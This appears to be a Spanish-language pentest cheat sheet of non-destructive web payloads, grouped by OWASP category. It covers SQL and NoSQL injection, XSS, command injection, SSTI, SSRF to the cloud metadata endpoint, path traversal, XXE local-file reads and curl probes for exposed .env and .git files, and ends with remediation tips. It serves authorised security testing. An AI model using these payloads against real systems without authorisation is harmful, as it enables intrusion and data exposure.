# Payloads de prueba (no destructivos)

Úsalos solo en entornos con autorización. No incluyen operaciones destructivas.

## A05 Inyección SQL (5)
```
'
' OR '1'='1' --
' AND 1=1 --
' AND 1=2 --
' UNION SELECT NULL,NULL --
```
Detección temporal: `' AND SLEEP(3) --` (MySQL), `'; WAITFOR DELAY '0:0:3' --` (SQL Server).

## A05 NoSQL (2)
```
{"$ne": null}
{"$gt": ""}
```

## A05 XSS (5)
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
```

## A05 Comandos (3)
```
; id
| whoami
$(id)
```

## A05 SSTI (2)
```
{{7*7}}
${7*7}
```

## A01 SSRF (4)
```
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:80/
http://[::1]/
file:///etc/hostname
```

## A01 Path traversal (2)
```
../../../../etc/hostname
..%2f..%2f..%2fetc%2fhostname
```

## A05 XXE (1)
```xml
<?xml version="1.0"?>
<!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<d>&x;</d>
```

## A03 Cadena de suministro (comandos de verificación)
```
npm ci
npm audit --omit=dev
pip install --require-hashes -r requirements.txt
pip-audit
```

## A02 Configuración
```
curl -sI https://objetivo.example
curl -s https://objetivo.example/.git/HEAD
curl -s https://objetivo.example/.env
```

Total: más de 25 payloads y comandos de prueba.

## Remediación rápida

- SQL: consultas parametrizadas, nunca concatenar.
- XSS: codificación de salida contextual y CSP.
- Comandos: evitar shell, usar APIs con lista de argumentos.
- SSRF: lista blanca de destinos y bloqueo de rangos internos.
- XXE: deshabilitar DTD y entidades externas en el parser.
